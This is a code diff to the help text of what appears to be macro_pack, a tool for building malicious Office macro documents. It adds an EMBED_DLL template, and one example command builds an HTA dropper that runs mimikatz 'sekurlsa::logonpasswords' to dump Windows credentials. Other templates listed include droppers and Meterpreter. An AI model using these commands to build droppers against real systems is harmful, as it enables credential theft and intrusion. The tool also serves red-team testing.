@@ -112,8 +112,16 @@ r"""
          -> Example1:  %s  -t EMBED_EXE --embed=%%windir%%\system32\calc.exe -o -G my_calc.vbs
          -> Example2: echo "path\\to\newcalc.exe" | %s -t EMBED_EXE --embed=%%windir%%\system32\calc.exe -o -G my_calc.doc
 
+                --------------------
+
+        EMBED_DLL
+        Combine with --embed option, it will drop and call a function in the given DLL
+        Give this template the name and parameters of function to call in DLL
+        -> Example1 : echo "main" | %s -t EMBED_DLL --embed=cmd.dll -o -G cmd.doc
+        -> Example2 : echo "main log privilege::debug sekurlsa::logonpasswords exit" | %s -t EMBED_DLL --embed=mimikatz.dll -o -G mimidropper.hta
+
                 --------------------  
-""" % (currentApp,currentApp,currentApp,currentApp,currentApp,currentApp,currentApp,currentApp,currentApp, currentApp)
+""" % (currentApp,currentApp,currentApp,currentApp,currentApp,currentApp,currentApp,currentApp,currentApp,currentApp, currentApp)
     print(templatesInfo)
     
     
@@ -159,7 +167,7 @@ def printUsage(banner, currentApp, mpSession):
         Note that macro_pack will automatically detect AutoOpen, Workbook_Open, or Document_Open  as the start function
         
     -t, --template=TEMPLATE_NAME    Use VBA template already included in %s.
-        Available templates are: HELLO, CMD, DROPPER, DROPPER2, DROPPER_PS, DROPPER_DLL, METERPRETER, WEBMETER, EMBED_EXE 
+        Available templates are: HELLO, CMD, DROPPER, DROPPER2, DROPPER_PS, DROPPER_DLL, METERPRETER, WEBMETER, EMBED_EXE, EMBED_DLL 
         Help for template usage: %s -t help
          
     -G, --generate=OUTPUT_FILE_PATH. Generates a file containing the macro. Will guess the format based on extension.
